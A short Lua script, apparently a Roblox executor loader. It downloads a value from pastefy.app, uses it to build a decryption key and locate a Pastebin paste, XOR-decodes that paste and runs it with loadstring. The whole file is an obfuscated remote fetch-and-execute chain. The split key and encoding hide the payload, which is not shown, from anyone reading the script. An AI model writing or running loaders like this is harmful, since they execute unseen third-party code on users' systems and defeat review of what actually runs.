local pastefy_raw="https://pastefy.app/0NhYgFqH/raw"
local key_part_a="0+;p-%d>#*3"

local function get(u)
    local ok,r=pcall(function()
        return game:HttpGet(u,true)
    end)
    if not ok or not r or r=="" then
        error("http")
    end
    return r
end

local function xor_decode(d,k)
    local t={}
    local l=#k
    for i=1,#d do
        local b=string.byte(d,i)
        local kb=string.byte(k,((i-1)%l)+1)
        t[i]=string.char(bit32.bxor(b,kb))
    end
    return table.concat(t)
end

local data=get(pastefy_raw):gsub("\r",""):gsub("\n","")
local id,partb=data:match("^([^|]+)|(.+)$")
if not id then error("pf") end

local key=key_part_a..partb
local enc=get("https://pastebin.com/raw/"..id)

local dec=xor_decode(enc,key)
loadstring(dec)()
